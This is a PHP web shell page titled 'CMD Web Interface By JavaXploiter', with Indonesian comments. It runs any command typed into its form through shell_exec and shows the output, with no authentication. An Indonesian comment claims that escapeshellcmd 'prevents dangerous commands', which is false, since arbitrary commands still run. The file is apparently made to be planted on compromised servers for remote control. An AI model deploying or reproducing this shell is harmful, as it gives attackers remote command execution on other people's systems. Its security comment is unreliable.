<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CMD Web Interface By JavaXploiter</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background-color: #28a745;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .result {
            margin-top: 20px;
            padding: 10px;
            background-color: #f7f7f7;
            border: 1px solid #ddd;
            border-radius: 5px;
            white-space: pre-wrap; /* agar hasil command tampil dengan format yang benar */
            position: relative; /* untuk menempatkan tombol copy */
        }
        .copy-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            padding: 5px 10px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
    <script>
        function copyToClipboard() {
            const resultText = document.getElementById("cmd-result").innerText;
            navigator.clipboard.writeText(resultText).then(function() {
                alert("Result copied to clipboard!");
            }, function(err) {
                console.error("Failed to copy text: ", err);
            });
        }
    </script>
</head>
<body>

<div class="container">
    <h2>CMD Web Interface By JavaXploiter</h2>
    <form method="post">
        <input type="text" name="command" placeholder="Enter The Command Dek" required>
        <input type="submit" value="Run Now">
    </form>

    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['command'])) {
        $command = escapeshellcmd($_POST['command']); // Mencegah perintah berbahaya
        echo "<div class='result'>";
        echo "<h3>Result:</h3>";
        echo "<pre id='cmd-result'>";
        $output = shell_exec($command);
        echo htmlspecialchars($output); // Menampilkan hasil
        echo "</pre>";
        echo "<button class='copy-btn' onclick='copyToClipboard()'>Copy</button>";
        echo "</div>";
    }
    ?>
</div>

</body>
</html>
